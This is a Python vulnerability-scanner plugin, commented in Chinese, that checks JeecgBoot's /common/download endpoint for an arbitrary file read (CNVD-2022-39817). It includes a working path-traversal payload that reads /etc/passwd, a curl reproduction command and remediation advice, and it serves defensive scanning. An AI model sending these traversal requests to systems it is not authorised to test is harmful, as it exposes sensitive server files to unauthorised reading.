# JeecgBoot 任意文件读取：/common/download 接口路径穿越（root: 特征，零破坏）
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_all
from plugins.base import PluginBase


class JeecgFileReadDownloadPlugin(PluginBase):
    name = "JeecgBoot 任意文件读取"
    cve = "CNVD-2022-39817"
    severity = "high"
    category = "vuln"
    description = "JeecgBoot /common/download 接口 fileName 参数目录穿越读取任意文件"
    fix = "升级 JeecgBoot 至 3.5.1+；download 接口增加路径白名单校验"
    fix_detail = (
        "【升级方案】升级至 JeecgBoot 3.5.1+（download 路径校验修复）\n"
        "【代码修复】CommonController.download 对 fileName 做规范化校验：\n"
        "  Path path = Paths.get(fileName).normalize();\n"
        '  if (!path.startsWith(uploadRoot)) { throw new ServiceException("非法路径"); }\n'
        "【WAF 规则】拦截 fileName 参数含 ../ 与 ..%2f 的请求\n"
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4"
    )
    reproduce = (
        'curl "http://target/jeecg-boot/common/download?fileName=../../../../../../etc/passwd"\n'
        "# 预期响应：响应体含 root:x:0:0（Linux /etc/passwd 特征）"
    )
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    vuln_type = "file_read"
    supports_waf_bypass = True

    def verify(self, target, session):
        url = join_url(target, "/jeecg-boot/common/download?fileName=../../../../../../etc/passwd")
        try:
            text = session.get(url).text or ""
        except Exception as e:
            print(no("JeecgBoot 任意文件读取（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        if match_all(text, ["root", ":/"]):
            print(ok("存在 JeecgBoot 任意文件读取"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 root 与 :/ 特征（/etc/passwd）",
                fix=self.fix,
                extra={"vuln_type": "arbitrary_file_read", "plugin_name": "jeecg_file_read"},
            )
        print(no("不存在 JeecgBoot 任意文件读取"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
